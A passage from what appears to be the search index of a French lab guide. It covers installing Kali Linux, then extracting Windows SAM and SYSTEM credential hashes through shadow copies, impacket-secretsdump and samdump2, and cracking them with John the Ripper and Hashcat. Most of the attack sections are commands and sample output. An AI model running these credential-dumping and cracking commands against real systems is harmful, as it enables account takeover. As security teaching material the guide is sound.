cohabite avec Windows sur le m\u00eame disque</li> <li>Installation native \u2014 Kali comme syst\u00e8me principal (d\u00e9conseill\u00e9 pour les d\u00e9butants)</li> </ul> <p>Conseil : Pour ce guide, l'installation en machine virtuelle est recommand\u00e9e. Elle est s\u00fbre, r\u00e9versible et parfaite pour un environnement de lab.</p>"},{"location":"kali/#methode-a-installation-sur-virtualbox-recommandee","title":"M\u00e9thode A \u2014 Installation sur VirtualBox (recommand\u00e9e)","text":""},{"location":"kali/#etape-1-telecharger-liso-kali-linux","title":"\u00c9tape 1 \u2014 T\u00e9l\u00e9charger l'ISO Kali Linux","text":"<p>Rendez-vous sur le site officiel : https://www.kali.org/get-kali/</p> <p>Choisissez l'image Installer (64-bit) :</p> <pre><code>kali-linux-2024.x-installer-amd64.iso\n</code></pre> <p>V\u00e9rifiez l'int\u00e9grit\u00e9 du fichier avec la somme SHA256 fournie sur le site :</p> <pre><code># Sous Linux/macOS\nsha256sum kali-linux-2024.x-installer-amd64.iso\n\n# Sous Windows (PowerShell)\nGet-FileHash kali-linux-2024.x-installer-amd64.iso -Algorithm SHA256\n</code></pre>"},{"location":"kali/#etape-2-creer-la-machine-virtuelle","title":"\u00c9tape 2 \u2014 Cr\u00e9er la Machine Virtuelle","text":"<ol> <li>Ouvrez VirtualBox \u2192 cliquez sur Nouvelle</li> <li>Renseignez les param\u00e8tres suivants :</li> </ol> <pre><code>Nom :           Kali Linux 2024\nType :          Linux\nVersion :       Debian (64-bit)\nRAM :           4096 Mo  (minimum 2048 Mo)\nDisque dur :    Cr\u00e9er un nouveau disque virtuel VDI\nTaille disque : 50 Go (allocation dynamique)\n</code></pre> <ol> <li>Avant de d\u00e9marrer, configurez les param\u00e8tres suppl\u00e9mentaires :</li> </ol> <pre><code>Syst\u00e8me \u2192 Processeur : 2 CPU\nAffichage \u2192 M\u00e9moire vid\u00e9o : 128 Mo\nR\u00e9seau \u2192 Adaptateur 1 : Mode Pont (ou NAT selon votre besoin)\nStockage \u2192 Lecteur optique : s\u00e9lectionner l'ISO Kali t\u00e9l\u00e9charg\u00e9\n</code></pre>"},{"location":"kali/#etape-3-demarrer-linstallation","title":"\u00c9tape 3 \u2014 D\u00e9marrer l'Installation","text":"<ol> <li>D\u00e9marrez la VM \u2192 le menu de d\u00e9marrage Kali s'affiche</li> <li>S\u00e9lectionnez Graphical Install</li> </ol>"},{"location":"kali/#etape-4-configuration-de-la-langue-et-du-clavier","title":"\u00c9tape 4 \u2014 Configuration de la langue et du clavier","text":"<pre><code>Langue :            Fran\u00e7ais\nPays :              France (ou votre pays)\nDisposition clavier: Fran\u00e7ais (AZERTY)\n</code></pre>"},{"location":"kali/#etape-5-configuration-reseau","title":"\u00c9tape 5 \u2014 Configuration r\u00e9seau","text":"<pre><code>Nom de la machine :  kali-lab\nDomaine :            (laisser vide)\n</code></pre>"},{"location":"kali/#etape-6-creation-du-compte-utilisateur","title":"\u00c9tape 6 \u2014 Cr\u00e9ation du compte utilisateur","text":"<pre><code>Nom complet :        Etudiant Lab\nNom d'utilisateur :  etudiant\nMot de passe :       [choisir un mot de passe fort]\n</code></pre> <p>Remarque : Depuis Kali 2020, le compte <code>root</code> n'est plus le compte par d\u00e9faut. Un utilisateur standard avec acc\u00e8s <code>sudo</code> est cr\u00e9\u00e9 \u00e0 la place.</p>"},{"location":"kali/#etape-7-partitionnement-du-disque","title":"\u00c9tape 7 \u2014 Partitionnement du disque","text":"<p>S\u00e9lectionnez Utiliser un disque entier pour une installation simple en VM :</p> <pre><code>Disque \u00e0 partitionner :  VBOX HARDDISK (le disque virtuel)\nSch\u00e9ma de partitionnement : Tout dans une seule partition\n\u2192 Terminer le partitionnement et appliquer les changements\n\u2192 Confirmer : Oui\n</code></pre>"},{"location":"kali/#etape-8-installation-du-systeme-de-base","title":"\u00c9tape 8 \u2014 Installation du syst\u00e8me de base","text":"<p>L'installation copie les fichiers syst\u00e8me (~10\u201320 minutes selon votre machine).</p>"},{"location":"kali/#etape-9-selection-des-logiciels","title":"\u00c9tape 9 \u2014 S\u00e9lection des logiciels","text":"<p>Laissez la s\u00e9lection par d\u00e9faut :</p> <pre><code>\u2705 Kali desktop environment (GNOME ou Xfce selon la version)\n\u2705 Top 10 \u2014 les 10 outils les plus utilis\u00e9s en pentest\n\u2705 Default recommended tools\n</code></pre>"},{"location":"kali/#etape-10-installation-du-chargeur-de-demarrage-grub","title":"\u00c9tape 10 \u2014 Installation du chargeur de d\u00e9marrage GRUB","text":"<pre><code>Installer GRUB sur le disque principal : Oui\nP\u00e9riph\u00e9rique : /dev/sda\n</code></pre>"},{"location":"kali/#etape-11-fin-de-linstallation","title":"\u00c9tape 11 \u2014 Fin de l'installation","text":"<ol> <li>Retirez l'ISO du lecteur virtuel</li> <li>Red\u00e9marrez la VM</li> <li>Connectez-vous avec les identifiants cr\u00e9\u00e9s \u00e0 l'\u00e9tape 6</li> </ol>"},{"location":"kali/#methode-b-image-virtualbox-pre-configuree-plus-rapide","title":"M\u00e9thode B \u2014 Image VirtualBox pr\u00e9-configur\u00e9e (plus rapide)","text":"<p>Kali propose des images VirtualBox et VMware pr\u00eates \u00e0 l'emploi :</p> <ol> <li>T\u00e9l\u00e9chargez l'image <code>.ova</code> sur https://www.kali.org/get-kali/#kali-virtual-machines</li> <li>Dans VirtualBox : Fichier \u2192 Importer un appareil virtuel</li> <li>S\u00e9lectionnez le fichier <code>.ova</code> \u2192 suivez l'assistant</li> <li>D\u00e9marrez la VM</li> </ol> <pre><code>Identifiants par d\u00e9faut de l'image pr\u00e9-configur\u00e9e :\nUtilisateur : kali\nMot de passe : kali\n\u26a0 \u00c0 modifier imm\u00e9diatement !\n</code></pre>"},{"location":"kali/#mise-a-jour-post-installation","title":"Mise \u00e0 jour post-installation","text":"<p>Une fois connect\u00e9, ouvrez un terminal et mettez le syst\u00e8me \u00e0 jour :</p> <pre><code>sudo apt update &amp;&amp; sudo apt full-upgrade -y\nsudo apt autoremove -y\n</code></pre> <p>V\u00e9rifiez la version install\u00e9e :</p> <pre><code>cat /etc/os-release\nuname -a\n</code></pre>"},{"location":"kali/#02-presentation-de-la-base-sam","title":"02 \u2014 Pr\u00e9sentation de la Base SAM","text":""},{"location":"kali/#quest-ce-que-la-base-sam","title":"Qu'est-ce que la base SAM ?","text":"<p>La SAM (Security Account Manager) est une base de donn\u00e9es Windows qui stocke les informations d'authentification des comptes utilisateurs locaux. Elle se trouve \u00e0 l'emplacement suivant :</p> <pre><code>C:\\Windows\\System32\\config\\SAM\n</code></pre>"},{"location":"kali/#ce-que-contient-la-sam","title":"Ce que contient la SAM","text":"<p>La SAM ne stocke jamais les mots de passe en clair. Elle conserve des hachages cryptographiques :</p> Format Description Exemple LM Hash Ancien format (&lt; Windows Vista), tr\u00e8s faible <code>aad3b435b51404ee</code> NTLM Hash Format actuel, MD4 du mot de passe en UTF-16 <code>31d6cfe0d16ae931b73c59d7e0c089c0</code>"},{"location":"kali/#architecture-de-protection","title":"Architecture de protection","text":"<pre><code>  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n  \u2502         Base de registre Windows    \u2502\n  \u2502                                     \u2502\n  \u2502  HKLM\\SAM  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502\u2500\u2500\u25b6 Chiffr\u00e9 par SYSKEY\n  \u2502  HKLM\\SYSTEM  (contient la cl\u00e9)  \u2500\u2500 \u2502\u2500\u2500\u25b6 N\u00e9cessaire pour d\u00e9chiffrer\n  \u2502                                     \u2502\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n  Fichiers physiques :\n  C:\\Windows\\System32\\config\\SAM\n  C:\\Windows\\System32\\config\\SYSTEM\n</code></pre> <p>Concept cl\u00e9 : La SAM est verrouill\u00e9e par Windows en cours d'ex\u00e9cution. Il est impossible de la copier directement depuis un Windows d\u00e9marr\u00e9. Il faut passer par des m\u00e9thodes alternatives (volume shadow copy, d\u00e9marrage live, etc.).</p>"},{"location":"kali/#03-extraction-des-hachages-sam","title":"03 \u2014 Extraction des Hachages SAM","text":""},{"location":"kali/#environnement-du-lab","title":"Environnement du lab","text":"<p>Pour ce laboratoire, nous utilisons :</p> <pre><code>Machine cible  : Windows 11 (VM VirtualBox)\nMachine attaquante : Kali Linux (VM VirtualBox)\nR\u00e9seau : R\u00e9seau interne VirtualBox (isol\u00e9)\nAcc\u00e8s requis : Administrateur local sur la cible Windows\n</code></pre> <p>\u26a0\ufe0f Ce lab n\u00e9cessite un acc\u00e8s administrateur pr\u00e9alable sur la machine Windows cible. L'objectif est d'extraire et craquer les hachages, pas de contourner l'authentification Windows.</p>"},{"location":"kali/#methode-1-extraction-via-volume-shadow-copy-depuis-windows","title":"M\u00e9thode 1 \u2014 Extraction via Volume Shadow Copy (depuis Windows)","text":"<p>Cette m\u00e9thode fonctionne depuis Windows avec des droits administrateur, sans d\u00e9marrer sur un live CD.</p> <p>Sur la machine Windows 11 cible, ouvrez un Invite de commandes en tant qu'Administrateur :</p>"},{"location":"kali/#etape-1-creer-un-cliche-instantane-du-volume","title":"\u00c9tape 1 \u2014 Cr\u00e9er un clich\u00e9 instantan\u00e9 du volume","text":"<pre><code>wmic shadowcopy call create Volume='C:\\'\n</code></pre>"},{"location":"kali/#etape-2-identifier-lid-du-cliche-cree","title":"\u00c9tape 2 \u2014 Identifier l'ID du clich\u00e9 cr\u00e9\u00e9","text":"<pre><code>vssadmin list shadows\n</code></pre> <p>Notez le chemin du dernier clich\u00e9, par exemple :</p> <pre><code>\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n</code></pre>"},{"location":"kali/#etape-3-copier-les-fichiers-sam-et-system","title":"\u00c9tape 3 \u2014 Copier les fichiers SAM et SYSTEM","text":"<pre><code>copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Temp\\SAM\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Temp\\SYSTEM\n</code></pre>"},{"location":"kali/#etape-4-transferer-les-fichiers-vers-kali","title":"\u00c9tape 4 \u2014 Transf\u00e9rer les fichiers vers Kali","text":"<p>Transf\u00e9rez <code>SAM</code> et <code>SYSTEM</code> vers votre machine Kali (via dossier partag\u00e9 VM, cl\u00e9 USB virtuelle, ou <code>scp</code>).</p>"},{"location":"kali/#methode-2-extraction-avec-impacket-secretsdump-depuis-kali","title":"M\u00e9thode 2 \u2014 Extraction avec impacket-secretsdump (depuis Kali)","text":"<p>Si vous disposez des identifiants d'un compte administrateur Windows, vous pouvez extraire les hachages \u00e0 distance depuis Kali :</p> <pre><code># Installation d'impacket si n\u00e9cessaire\nsudo apt install python3-impacket -y\n\n# Extraction \u00e0 distance\nimpacket-secretsdump Administrateur:'MotDePasse'@192.168.1.50\n</code></pre> <p>R\u00e9sultat attendu :</p> <pre><code>[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nInvit\u00e9:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\netudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n</code></pre>"},{"location":"kali/#methode-3-extraction-avec-samdump2-fichiers-copies","title":"M\u00e9thode 3 \u2014 Extraction avec samdump2 (fichiers copi\u00e9s)","text":"<p>Si vous avez r\u00e9cup\u00e9r\u00e9 les fichiers <code>SAM</code> et <code>SYSTEM</code> physiques :</p> <pre><code># Installation\nsudo apt install samdump2 -y\n\n# Extraction des hachages\nsamdump2 SYSTEM SAM &gt; hashes.txt\n\n# V\u00e9rifier le contenu\ncat hashes.txt\n</code></pre> <p>R\u00e9sultat typique :</p> <pre><code>Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\netudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n</code></pre>"},{"location":"kali/#format-des-hachages-ntlm","title":"Format des hachages NTLM","text":"<pre><code>nom_utilisateur : RID : LM_hash : NTLM_hash :::\n      \u2502            \u2502       \u2502           \u2502\n      \u2502            \u2502       \u2502           \u2514\u2500\u2500 Hachage MD4 du mot de passe (32 caract\u00e8res hex)\n      \u2502            \u2502       \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 LM hash (d\u00e9sactiv\u00e9 sur Win Vista+, valeur vide)\n      \u2502            \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Identifiant relatif (500 = Administrateur)\n      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Nom du compte\n</code></pre>"},{"location":"kali/#04-attaque-par-dictionnaire-avec-john-the-ripper","title":"04 \u2014 Attaque par Dictionnaire avec John the Ripper","text":""},{"location":"kali/#principe-de-lattaque-par-dictionnaire","title":"Principe de l'attaque par dictionnaire","text":"<p>Une attaque par dictionnaire teste une liste de mots de passe courants (le dictionnaire) en les hachant un par un et en comparant le r\u00e9sultat au hachage cible. Elle est rapide et efficace contre les mots de passe faibles ou courants.</p> <pre><code>  Dictionnaire            John the Ripper           Hachage cible\n  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n  \u2502 password \u2502 \u2500 hash \u2500\u2500\u25b6\u2502  MD4(mot)   \u2502\u2500\u2500compare\u2500\u25b6\u2502 8846f7ea... \u2502\n  \u2502 123456   \u2502           \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2717      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n  \u2502 azerty   \u2502                  \u2502\n  \u2502 admin    \u2502           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n  \u2502 letmein  \u2502 \u2500 hash \u2500\u2500\u25b6\u2502  MD4(mot)   \u2502\u2500\u2500compare\u2500\u25b6 \u2713 TROUV\u00c9 !\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518           \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"kali/#installation-et-verification-de-john","title":"Installation et v\u00e9rification de John","text":"<pre><code># John est pr\u00e9install\u00e9 sur Kali, v\u00e9rifier la version\njohn --version\n\n# Si absent, installer\nsudo apt install john -y\n</code></pre>"},{"location":"kali/#preparer-le-fichier-de-hachages","title":"Pr\u00e9parer le fichier de hachages","text":"<p>Assurez-vous que votre fichier <code>hashes.txt</code> contient les hachages au format correct :</p> <pre><code>cat hashes.txt\n# Attendu :\n# etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n</code></pre> <p>Si vous n'avez que le hachage NTLM brut, cr\u00e9ez un fichier au bon format :</p> <pre><code>echo \"etudiant:8846f7eaee8fb117ad06bdd830b7586c\" &gt; hashes_ntlm.txt\n</code></pre>"},{"location":"kali/#wordlist-rockyoutxt","title":"Wordlist \u2014 Rockyou.txt","text":"<p>Kali inclut le c\u00e9l\u00e8bre dictionnaire rockyou.txt contenant plus de 14 millions de mots de passe r\u00e9els issus de fuites de donn\u00e9es :</p> <pre><code># Localiser rockyou.txt\nlocate rockyou.txt\n\n# Il se trouve g\u00e9n\u00e9ralement ici :\nls -lh /usr/share/wordlists/rockyou.txt.gz\n\n# D\u00e9compresser si n\u00e9cessaire\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\n\n# V\u00e9rifier le nombre de lignes\nwc -l /usr/share/wordlists/rockyou.txt\n# \u2192 14 344 391 mots de passe\n</code></pre>"},{"location":"kali/#lancer-lattaque-par-dictionnaire","title":"Lancer l'attaque par dictionnaire","text":""},{"location":"kali/#attaque-basique-avec-rockyoutxt","title":"Attaque basique avec rockyou.txt","text":"<pre><code>john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n</code></pre>"},{"location":"kali/#attaque-avec-format-auto-detecte","title":"Attaque avec format auto-d\u00e9tect\u00e9","text":"<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n</code></pre>"},{"location":"kali/#attaque-avec-regles-de-transformation-mangling-rules","title":"Attaque avec r\u00e8gles de transformation (mangling rules)","text":"<p>Les r\u00e8gles appliquent des transformations automatiques sur chaque mot du dictionnaire (majuscules, ajout de chiffres, substitutions, etc.) :</p> <pre><code># R\u00e8gles par d\u00e9faut de John\njohn --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt\n\n# R\u00e8gles Jumbo (plus compl\u00e8tes, Kali inclut John Jumbo)\njohn --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules=jumbo hashes.txt\n</code></pre> <p>Exemples de transformations appliqu\u00e9es par les r\u00e8gles :</p> <pre><code>password   \u2192  Password, PASSWORD, p@ssword, passw0rd, password123\nadmin      \u2192  Admin, ADMIN, adm1n, admin!, Admin2024\n</code></pre>"},{"location":"kali/#attaque-avec-un-dictionnaire-personnalise","title":"Attaque avec un dictionnaire personnalis\u00e9","text":"<pre><code># Cr\u00e9er un dictionnaire cibl\u00e9\ncat &gt; mon_dico.txt &lt;&lt; EOF\nazerty\nAzerty123\nmotdepasse\nMotdepasse1\nNomEntreprise2024\nKali@2024\nEOF\n\njohn --format=NT --wordlist=mon_dico.txt hashes.txt\n</code></pre>"},{"location":"kali/#suivre-la-progression","title":"Suivre la progression","text":"<pre><code># Pendant l'attaque, appuyez sur Entr\u00e9e pour voir la progression\n# Ou dans un autre terminal :\njohn --status\n\n# Affichage typique :\n# 0g 0:00:00:12  3.2% (ETA: 14:35:22) 0g/s 1842Kp/s 1842Kc/s\n# g = mots de passe trouv\u00e9s, p/s = mots test\u00e9s par seconde\n</code></pre>"},{"location":"kali/#afficher-les-mots-de-passe-trouves","title":"Afficher les mots de passe trouv\u00e9s","text":"<pre><code># Afficher les r\u00e9sultats trouv\u00e9s\njohn --show hashes.txt\n\n# Afficher uniquement les hachages NT\njohn --show --format=NT hashes.txt\n</code></pre> <p>Exemple de r\u00e9sultat :</p> <pre><code>etudiant:password:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n\n1 password hash cracked, 0 left\n</code></pre> <p>Conseil : John sauvegarde automatiquement sa progression dans <code>~/.john/john.pot</code>. Pour relancer une attaque sur un hachage d\u00e9j\u00e0 crack\u00e9, supprimez cette entr\u00e9e ou utilisez <code>--pot=fichier_different.pot</code>.</p>"},{"location":"kali/#05-attaque-par-force-brute-avec-john-the-ripper","title":"05 \u2014 Attaque par Force Brute avec John the Ripper","text":""},{"location":"kali/#principe-de-lattaque-par-force-brute","title":"Principe de l'attaque par force brute","text":"<p>La force brute teste toutes les combinaisons possibles de caract\u00e8res selon un jeu de caract\u00e8res et une longueur d\u00e9finis. Elle est exhaustive mais tr\u00e8s lente \u2014 particuli\u00e8rement sur les mots de passe longs.</p> <pre><code>  Jeu de caract\u00e8res : a-z (26 lettres)\n  Longueur : 4 caract\u00e8res\n  Combinaisons : 26^4 = 456 976\n\n  aaaa \u2192 aab \u2192 aac \u2192 ... \u2192 zzzz\n  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n  \u2502 Toutes les combinaisons sont \u2502\n  \u2502 test\u00e9es sans exception       \u2502\n  \u2502 \u2713 Garantit de trouver le MDP \u2502\n  \u2502 \u2717 Peut prendre tr\u00e8s longtemps\u2502\n  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"kali/#modes-de-force-brute-dans-john","title":"Modes de force brute dans John","text":"<p>John the Ripper utilise les masques pour d\u00e9finir pr\u00e9cis\u00e9ment le jeu de caract\u00e8res \u00e0 utiliser.</p>"},{"location":"kali/#jeux-de-caracteres-disponibles-charsets","title":"Jeux de caract\u00e8res disponibles (charsets)","text":"Symbole Caract\u00e8res inclus <code>?l</code> Minuscules : <code>a-z</code> <code>?u</code> Majuscules : <code>A-Z</code> <code>?d</code> Chiffres : <code>0-9</code> <code>?s</code> Symboles : <code>!@#$%^&amp;*</code> etc. <code>?a</code> Tous : minuscules + majuscules + chiffres + symboles <code>?h</code> Hexad\u00e9cimal bas : <code>0-9a-f</code>"},{"location":"kali/#attaque-force-brute-mode-incremental-automatique","title":"Attaque force brute \u2014 Mode Incremental (automatique)","text":"<p>Le mode <code>--incremental</code> de John teste toutes les combinaisons de longueur croissante automatiquement :</p> <pre><code># Force brute compl\u00e8te (tr\u00e8s lent, toutes longueurs et tous caract\u00e8res)\njohn --format=NT --incremental hashes.txt\n\n# Force brute sur chiffres uniquement (codes PIN, etc.)\njohn --format=NT --incremental=Digits hashes.txt\n\n# Force brute sur minuscules uniquement\njohn --format=NT --incremental=Lower hashes.txt\n\n# Force brute sur minuscules + chiffres\njohn --format=NT --incremental=LowerNum hashes.txt\n\n# Force brute sur l'alphabet complet\njohn --format=NT --incremental=Alpha hashes.txt\n</code></pre>"},{"location":"kali/#attaque-force-brute-mode-masque-recommande","title":"Attaque force brute \u2014 Mode Masque (recommand\u00e9)","text":"<p>Le mode masque permet de cibler pr\u00e9cis\u00e9ment la structure du mot de passe, ce qui est beaucoup plus efficace :</p> <pre><code># Mot de passe de 4 caract\u00e8res, minuscules uniquement\njohn --format=NT --mask='?l?l?l?l' hashes.txt\n\n# Mot de passe de 6 chiffres (code PIN)\njohn --format=NT --mask='?d?d?d?d?d?d' hashes.txt\n\n# Mot de passe de 8 caract\u00e8res : 1 majuscule + 5 minuscules + 2 chiffres\njohn --format=NT --mask='?u?l?l?l?l?l?d?d' hashes.txt\n\n# Mot de passe de longueur variable (6 \u00e0 8 caract\u00e8res, tout type)\njohn --format=NT --mask='?a?a?a?a?a?a' --min-length=6 --max-length=8 hashes.txt\n\n# Mot de passe commen\u00e7ant par une majuscule, suivi de minuscules et finissant par des chiffres\njohn --format=NT --mask='?u?l?l?l?l?d?d?d' hashes.txt\n</code></pre>"},{"location":"kali/#exemple-pratique-mot-de-passe-type-prenom2024","title":"Exemple pratique \u2014 mot de passe type \"Prenom2024\"","text":"<pre><code># Structure : 1 majuscule + minuscules (longueur variable) + 4 chiffres\n# On suppose 5 minuscules + 4 chiffres\njohn --format=NT --mask='?u?l?l?l?l?l?d?d?d?d' hashes.txt\n</code></pre>"},{"location":"kali/#combiner-force-brute-et-dictionnaire-attaque-hybride","title":"Combiner force brute et dictionnaire (attaque hybride)","text":"<p>Une attaque hybride combine un dictionnaire avec des mutations en suffixe/pr\u00e9fixe :</p> <pre><code># Dictionnaire + chiffres en suffixe (ex: password123, admin2024)\njohn --format=NT --wordlist=/usr/share/wordlists/rockyou.txt \\\n     --mask='?w?d?d?d?d' hashes.txt\n\n# Dictionnaire + symbole + chiffres\njohn --format=NT --wordlist=/usr/share/wordlists/rockyou.txt \\\n     --mask='?w?s?d?d' hashes.txt\n</code></pre> <p>Rappel : <code>?w</code> repr\u00e9sente le mot courant du dictionnaire dans une attaque hybride.</p>"},{"location":"kali/#limiter-le-temps-dexecution","title":"Limiter le temps d'ex\u00e9cution","text":"<pre><code># Arr\u00eater apr\u00e8s 1 heure\njohn --format=NT --incremental hashes.txt --max-run-time=3600\n\n# Arr\u00eater apr\u00e8s avoir trouv\u00e9 N mots de passe\njohn --format=NT --incremental hashes.txt --max-crack=1\n</code></pre>"},{"location":"kali/#reprendre-une-attaque-interrompue","title":"Reprendre une attaque interrompue","text":"<p>John sauvegarde automatiquement sa progression :</p> <pre><code># Reprendre l\u00e0 o\u00f9 l'attaque s'est arr\u00eat\u00e9e\njohn --restore\n\n# Reprendre une session nomm\u00e9e\njohn --restore=nom_session\n\n# Lancer une attaque avec un nom de session\njohn --format=NT --incremental hashes.txt --session=ma_session\n</code></pre>"},{"location":"kali/#06-analyse-des-resultats","title":"06 \u2014 Analyse des R\u00e9sultats","text":""},{"location":"kali/#afficher-tous-les-mots-de-passe-crackes","title":"Afficher tous les mots de passe crack\u00e9s","text":"<pre><code># Afficher les r\u00e9sultats depuis le fichier pot\njohn --show hashes.txt\n\n# Format d\u00e9taill\u00e9\njohn --show --format=NT hashes.txt\n</code></pre>"},{"location":"kali/#lire-le-fichier-pot-directement","title":"Lire le fichier .pot directement","text":"<pre><code>cat ~/.john/john.pot\n# Format : $NT$hash:motdepasse_en_clair\n</code></pre>"},{"location":"kali/#comparer-les-performances","title":"Comparer les performances","text":"M\u00e9thode Vitesse typique Efficacit\u00e9 Dictionnaire (rockyou) ~5\u201310 millions/s \u00c9lev\u00e9e sur mots courants Dictionnaire + r\u00e8gles ~1\u20133 millions/s Tr\u00e8s \u00e9lev\u00e9e Force brute (masque court) ~500K\u20132M/s Totale mais lente Force brute (incr\u00e9mental) Variable Garantie mais peut prendre des ann\u00e9es <p>Remarque : Les performances d\u00e9pendent fortement du mat\u00e9riel. Un GPU d\u00e9di\u00e9 avec Hashcat est bien plus rapide que John sur CPU pour la force brute pure.</p>"},{"location":"kali/#interpreter-les-resultats","title":"Interpr\u00e9ter les r\u00e9sultats","text":"<pre><code>etudiant:password \u2192 Mot de passe tr\u00e8s faible, pr\u00e9sent dans rockyou.txt\nadmin:Admin2024!  \u2192 Crack\u00e9 par r\u00e8gles (majuscule + ann\u00e9e + symbole)\nroot:[non trouv\u00e9] \u2192 Mot de passe fort ou absent du dictionnaire\n</code></pre>"},{"location":"kali/#aller-plus-loin-hashcat-gpu","title":"Aller plus loin \u2014 Hashcat (GPU)","text":"<p>Pour des attaques plus rapides avec un GPU :</p> <pre><code># Installation\nsudo apt install hashcat -y\n\n# Attaque dictionnaire sur hachages NTLM (mode -m 1000)\nhashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt\n\n# Force brute NTLM, 8 caract\u00e8res, tout type\nhashcat -m 1000 -a 3 hashes_ntlm.txt '?a?a?a?a?a?a?a?a'\n\n# R\u00e8gles de transformation\nhashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n</code></pre>"},{"location":"kali/#07-commandes-de-reference-rapide","title":"07 \u2014 Commandes de R\u00e9f\u00e9rence Rapide","text":""},{"location":"kali/#john-the-ripper","title":"John the Ripper","text":"<pre><code># V\u00e9rifier la version\njohn --version\n\n# Attaque par dictionnaire (format NT)\njohn --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Attaque par dictionnaire avec r\u00e8gles\njohn --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt\n\n# Force brute incr\u00e9mentale\njohn --format=NT --incremental hashes.txt\n\n# Force brute par masque (ex: 8 caract\u00e8res tout type)\njohn --format=NT --mask='?a?a?a?a?a?a?a?a' hashes.txt\n\n# Afficher les r\u00e9sultats trouv\u00e9s\njohn --show hashes.txt\n\n# Voir la progression\njohn --status\n\n# Reprendre une session\njohn --restore\n</code></pre>"},{"location":"kali/#extraction-des-hachages","title":"Extraction des hachages","text":"<pre><code># Avec impacket (\u00e0 distance)\nimpacket-secretsdump Administrateur:'mdp'@IP_CIBLE\n\n# Avec samdump2 (fichiers locaux)\nsamdump2 SYSTEM SAM &gt; hashes.txt\n\n# D\u00e9compresser rockyou.txt\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\n</code></pre>"},{"location":"kali/#utilitaires-divers","title":"Utilitaires divers","text":"<pre><code># Localiser les wordlists disponibles sur Kali\nls /usr/share/wordlists/\n\n# Compter les lignes d'un dictionnaire\nwc -l /usr/share/wordlists/rockyou.txt\n\n# Supprimer le fichier .pot (repartir de z\u00e9ro)\nrm ~/.john/john.pot\n\n# Afficher les formats support\u00e9s par John\njohn --list=formats | grep -i NT\n</code></pre>"},{"location":"kali/#mesures-de-protection-perspective-defensive","title":"Mesures 